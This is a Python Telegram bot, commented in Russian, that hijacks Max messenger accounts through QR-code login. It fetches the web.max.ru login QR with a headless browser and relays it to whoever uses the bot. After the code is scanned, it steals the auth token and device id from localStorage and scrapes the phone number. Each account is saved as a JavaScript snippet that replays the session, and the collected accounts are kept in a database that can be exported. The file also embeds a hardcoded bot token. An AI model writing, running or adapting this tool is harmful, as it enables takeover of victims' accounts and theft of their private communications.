# Бот сделан @loyalxss a.k @erebusgod | Буду рад отзыву и дальнейшей работе!

# импорты библиотек ( не трогать )
import asyncio
import json
import logging
import os
import re
import shutil
import zipfile
from datetime import datetime, date
from pathlib import Path

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    FSInputFile, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from playwright.async_api import async_playwright, Page

# ---------- настройки ----------
BOT_TOKEN = "8699807612:AAFeNnt8wF6Nxth7ajalNb91Ixy32Ue9brs" # токен
TARGET_URL = "https://web.max.ru" # великий сайт мах, не изменять
QR_SELECTOR = "div.qr svg" # не изменять
LOGIN_TIMEOUT = 60_000 # таймер для сканирования QR , в max`e 60 сек, поэтому не изменять

# ---------- файлы, ( база данных ) ----------
BASE_DATA_DIR = Path("user_data") # корневая папка для всех данных бота
BASE_DATA_DIR.mkdir(exist_ok=True) # если папки нет, то создаем папку

def get_user_dir(user_id: int) -> Path:
    user_dir = BASE_DATA_DIR / str(user_id)
    user_dir.mkdir(exist_ok=True)
    return user_dir

def get_accounts_dir(user_id: int) -> Path:
    acc_dir = get_user_dir(user_id) / "accounts"
    acc_dir.mkdir(exist_ok=True)
    return acc_dir

def get_stats_path(user_id: int) -> Path:
    return get_user_dir(user_id) / "stats.json"

def load_stats(user_id: int) -> dict:
    path = get_stats_path(user_id)
    if path.exists():
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"total": 0, "today": 0, "exports": 0, "last_date": str(date.today())}

def save_stats(user_id: int, stats: dict):
    with open(get_stats_path(user_id), "w", encoding="utf-8") as f:
        json.dump(stats, f, ensure_ascii=False, indent=2)

def update_stats_on_login(user_id: int):
    stats = load_stats(user_id)
    today = str(date.today())
    if stats.get("last_date") != today:
        stats["today"] = 0
        stats["last_date"] = today
    stats["total"] += 1
    stats["today"] += 1
    save_stats(user_id, stats)

def update_stats_on_export(user_id: int):
    stats = load_stats(user_id)
    stats["exports"] += 1
    save_stats(user_id, stats)

# ---------- сессии и временные данные ----------
user_sessions = {}
user_temp_data = {}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ---------- фсм ( FSM ) не трогать это----------
class ClearConfirm(StatesGroup):
    first = State()
    second = State()

class SaveFormat(StatesGroup):
    waiting = State()

# ---------- кнопки главного меню ( можно поизменять текста ) ----------
main_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="🔐 Войти в аккаунт")],
        [KeyboardButton(text="📊 База аккаунтов")],
        [KeyboardButton(text="📦 Выгрузить базу")],
        [KeyboardButton(text="🗑 Очистить базу")],
    ],
    resize_keyboard=True,
    input_field_placeholder="Выберите действие"
)

# ---------- вспомогательные функции ----------
async def close_user_session(user_id: int):
    session = user_sessions.pop(user_id, None)
    if session:
        try:
            await session["browser"].close()
            logging.info(f"Сессия {user_id} закрыта")
        except Exception as e:
            logging.error(f"Ошибка закрытия сессии {user_id}: {e}")

async def extract_account_data(page: Page) -> dict | None:
    # ожидание загрузки интерфейса, что б подтвержить вход в акк
    try:
        await page.wait_for_selector("div.left-sidebar, div.sidebar", timeout=10000)
    except:
        pass
        # лутаем токен
    local_storage = await page.evaluate("() => JSON.stringify(localStorage)")
    ls = json.loads(local_storage)
    device_id = ls.get("__oneme_device_id", "")
    auth_data = ls.get("__oneme_auth", "")
    if not auth_data:
        return None

    phone = None
    try:
        # клик по настройкам ( для получения номера )
        settings_selectors = [
            "button[aria-label='Настройки']",
            "button[aria-label='Settings']",
            "div[data-testid='settings-button']",
            ".settings-btn",
            ".icon-settings",
            "button:has-text('Настройки')",
            "button:has-text('Settings')",
            "a:has-text('Настройки')",
            "a:has-text('Settings')",
            "[class*='settings']",
            "[class*='Settings']",
        ]
        clicked = False
        for sel in settings_selectors:
            try:
                await page.click(sel, timeout=3000)
                clicked = True
                break
            except:
                continue

        if not clicked:
            await page.click("div.avatar, div[class*='avatar']")
            await asyncio.sleep(1)
            await page.click("text=Настройки, text=Settings")

        await page.wait_for_selector("div.modal, div.settings-page, div[class*='settings']", timeout=5000)
        await asyncio.sleep(1)

        phone_selectors = [
            "div:has-text('+7')",
            "span:has-text('+7')",
            "div[class*='phone']",
            "span[class*='phone']",
            "[data-testid='phone-number']",
            ".profile-phone",
        ]
        for sel in phone_selectors:
            try:
                el = await page.wait_for_selector(sel, timeout=2000)
                if el:
                    text = await el.text_content()
                    match = re.search(r'(\+7|8)\s*\(?\d{3}\)?\s*\d{3}[-\s]?\d{2}[-\s]?\d{2}', text)
                    if match:
                        phone = match.group(0)
                    else:
                        phone = text.strip()
                    phone = phone.replace("+", "").replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
                    if phone.startswith("8"):
                        phone = "7" + phone[1:]
                    break
            except:
                continue

        try:
            await page.click("button[aria-label='Закрыть'], .close, .modal-close", timeout=1000)
        except:
            pass

    except Exception as e:
        logging.warning(f"Не удалось извлечь номер через настройки: {e}")

    if not phone:
        try:
            auth_json = json.loads(auth_data)
            viewer_id = auth_json.get("viewerId")
            if viewer_id:
                phone = f"id{viewer_id}"
        except:
            phone = "unknown"

    return {"phone": phone, "device_id": device_id, "auth_data": auth_data}

async def monitor_login(page: Page, user_id: int, message: types.Message, state: FSMContext):
    try:
        await page.wait_for_selector(QR_SELECTOR, state="detached", timeout=LOGIN_TIMEOUT)
        await message.answer("✅ Вход выполнен! Извлекаю данные...")
        await asyncio.sleep(2)

        data = await extract_account_data(page)
        if not data:
            await message.answer("❌ Не удалось извлечь токен авторизации.")
            return

        user_temp_data[user_id] = data
            # выбор расширения файла
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📄 Сохранить как .txt", callback_data="save_format_txt")],
            [InlineKeyboardButton(text="📦 Сохранить как .json", callback_data="save_format_json")]
        ])
        await message.answer(
            f"✅ Данные извлечены!\n"
            f"📱 Телефон: `{data['phone']}`\n\n"
            f"В каком формате сохранить токен?",
            reply_markup=kb,
            parse_mode="Markdown"
        )
        await state.set_state(SaveFormat.waiting)

    except asyncio.TimeoutError:
        await message.answer("⚠️ Время ожидания входа истекло.")
    except Exception as e:
        logging.error(f"Ошибка в monitor_login: {e}")
        await message.answer("❌ Произошла ошибка при обработке входа.")

async def login_process(user_id: int, message: types.Message, state: FSMContext):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=["--disable-blink-features=AutomationControlled",
                  "--disable-dev-shm-usage", "--no-sandbox"]
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        page = await context.new_page()
        user_sessions[user_id] = {"browser": browser, "page": page}

        try:
            await page.goto(TARGET_URL, wait_until="networkidle")
            qr_element = await page.wait_for_selector(QR_SELECTOR, timeout=15000)
            screenshot_bytes = await qr_element.screenshot()

            temp_file = f"qr_{user_id}.png"
            with open(temp_file, "wb") as f:
                f.write(screenshot_bytes)
            photo = FSInputFile(temp_file)
            await message.answer_photo(photo, caption="🔐 Отсканируйте QR-код для входа")
            os.remove(temp_file)

            await monitor_login(page, user_id, message, state)

        except asyncio.TimeoutError:
            await message.answer("❌ Не удалось найти QR-код на странице.")
        except Exception as e:
            logging.error(f"Ошибка в login_process: {e}")
            await message.answer("❌ Ошибка при получении QR-кода.")
        finally:
            await close_user_session(user_id)

# ---------- обработчики и /start ----------
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "👋 Добро пожаловать в менеджер аккаунтов Max!\n"
        "Используйте кнопки ниже для управления.",
        reply_markup=main_kb
    )

@dp.message(F.text == "🔐 Войти в аккаунт")
async def handle_login(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in user_sessions:
        await close_user_session(user_id)
        await message.answer("🔄 Предыдущая сессия сброшена.")
    await message.answer("🚀 Запускаю браузер, ожидайте QR-код...")
    asyncio.create_task(login_process(user_id, message, state))

@dp.callback_query(F.data.startswith("save_format_"), SaveFormat.waiting)
async def process_save_format(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await callback.answer()
    data = user_temp_data.pop(user_id, None)
    if not data:
        await callback.message.edit_text("❌ Данные не найдены. Попробуйте войти заново.")
        await state.clear()
        return

    ext = "txt" if callback.data == "save_format_txt" else "json"
    phone = data["phone"]
    device_id = data["device_id"]
    auth_data = data["auth_data"]

    acc_dir = get_accounts_dir(user_id)
    file_path = acc_dir / f"{phone}.{ext}"

    js_string = (
        f"sessionStorage.clear();"
        f"localStorage.clear();"
        f"localStorage.setItem('__oneme_device_id','{device_id}');"
        f"localStorage.setItem('__oneme_auth','{auth_data}');"
        f"window.location.reload();"
    )

    with open(file_path, "w", encoding="utf-8") as f:
        f.write(js_string)

    update_stats_on_login(user_id)

    await callback.message.edit_text(
        f"✅ Аккаунт сохранён!\n"
        f"📱 Телефон: `{phone}`\n"
        f"📁 Файл: `{phone}.{ext}`",
        parse_mode="Markdown"
    )
    await state.clear()

@dp.message(F.text == "📊 База аккаунтов")
async def handle_stats(message: types.Message):
    user_id = message.from_user.id
    stats = load_stats(user_id)
    text = (
        "📊 **Статистика аккаунтов**\n\n"
        f"▪️ Всего загружено: `{stats['total']}`\n"
        f"▪️ За сегодня: `{stats['today']}`\n"
        f"▪️ Выгрузок базы: `{stats['exports']}`"
    )
    await message.answer(text, parse_mode="Markdown")

@dp.message(F.text == "📦 Выгрузить базу")
async def handle_export_menu(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📁 Всю базу", callback_data="export_all")],
        [InlineKeyboardButton(text="📅 За сегодня", callback_data="export_today")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="export_cancel")]
    ])
    await message.answer("Выберите тип выгрузки:", reply_markup=kb)

@dp.callback_query(F.data.startswith("export_"))
async def process_export(callback: CallbackQuery):
    user_id = callback.from_user.id
    await callback.answer()
    if callback.data == "export_cancel":
        await callback.message.edit_text("❌ Выгрузка отменена.")
        return

    acc_dir = get_accounts_dir(user_id)
    if not acc_dir.exists() or not any(acc_dir.iterdir()):
        await callback.message.edit_text("⚠️ База аккаунтов пуста.")
        return

    tmp_dir = Path(f"tmp_export_{user_id}")
    tmp_dir.mkdir(exist_ok=True)
    zip_path = Path(f"export_{user_id}_{int(datetime.now().timestamp())}.zip")

    try:
        if callback.data == "export_all":
            files = list(acc_dir.glob("*.*"))  # все файлы, не только json
        else:  # export_today
            today = date.today().isoformat()
            files = [f for f in acc_dir.glob("*.*")
                     if date.fromtimestamp(f.stat().st_mtime).isoformat() == today]

        if not files:
            await callback.message.edit_text("⚠️ Нет аккаунтов за выбранный период.")
            return

        for f in files:
            shutil.copy(f, tmp_dir / f.name)

        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in tmp_dir.iterdir():
                zf.write(f, arcname=f.name)

        update_stats_on_export(user_id)
        await callback.message.edit_text("📦 Архив готов, отправляю...")
        await bot.send_document(user_id, FSInputFile(zip_path))
    except Exception as e:
        logging.error(f"Export error: {e}")
        await callback.message.edit_text("❌ Ошибка при создании архива.")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)
        if zip_path.exists():
            zip_path.unlink()

@dp.message(F.text == "🗑 Очистить базу")
async def handle_clear_start(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    stats = load_stats(user_id)
    if stats["total"] == 0:
        await message.answer("⚠️ База уже пуста.")
        return

    acc_dir = get_accounts_dir(user_id)
    today_files = [f for f in acc_dir.glob("*.*")
                   if date.fromtimestamp(f.stat().st_mtime).isoformat() == str(date.today())]
    if today_files:
        tmp_dir = Path(f"tmp_backup_{user_id}")
        tmp_dir.mkdir(exist_ok=True)
        zip_path = Path(f"backup_today_{user_id}.zip")
        try:
            for f in today_files:
                shutil.copy(f, tmp_dir / f.name)
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for f in tmp_dir.iterdir():
                    zf.write(f, arcname=f.name)
            await message.answer_document(FSInputFile(zip_path), caption="📦 Автоматический бэкап сегодняшних аккаунтов")
        except Exception as e:
            logging.error(f"Backup error: {e}")
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)
            if zip_path.exists():
                zip_path.unlink()

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да", callback_data="clear_confirm_1"),
         InlineKeyboardButton(text="❌ Нет", callback_data="clear_cancel")]
    ])
    await message.answer(
        "⚠️ Вы точно хотите очистить **всю** базу аккаунтов?\n"
        "Бэкап сегодняшних аккаунтов уже отправлен выше.",
        reply_markup=kb, parse_mode="Markdown"
    )
    await state.set_state(ClearConfirm.first)

@dp.callback_query(F.data == "clear_cancel")
async def clear_cancel(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("❌ Очистка отменена.")
    await state.clear()

@dp.callback_query(F.data == "clear_confirm_1", ClearConfirm.first)
async def clear_confirm_first(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да, удалить безвозвратно", callback_data="clear_confirm_2")],
        [InlineKeyboardButton(text="❌ Нет", callback_data="clear_cancel")]
    ])
    await callback.message.edit_text(
        "‼️ **Последнее предупреждение!**\n"
        "Все файлы аккаунтов будут удалены без возможности восстановления.\n"
        "Вы уверены?",
        reply_markup=kb, parse_mode="Markdown"
    )
    await state.set_state(ClearConfirm.second)

@dp.callback_query(F.data == "clear_confirm_2", ClearConfirm.second)
async def clear_confirm_second(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await callback.answer()
    acc_dir = get_accounts_dir(user_id)
    count = 0
    for f in acc_dir.glob("*.*"):
        f.unlink()
        count += 1
    await callback.message.edit_text(f"✅ База очищена. Удалено файлов: {count}")
    await state.clear()

# ---------- не трогать, основной запуск ----------
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
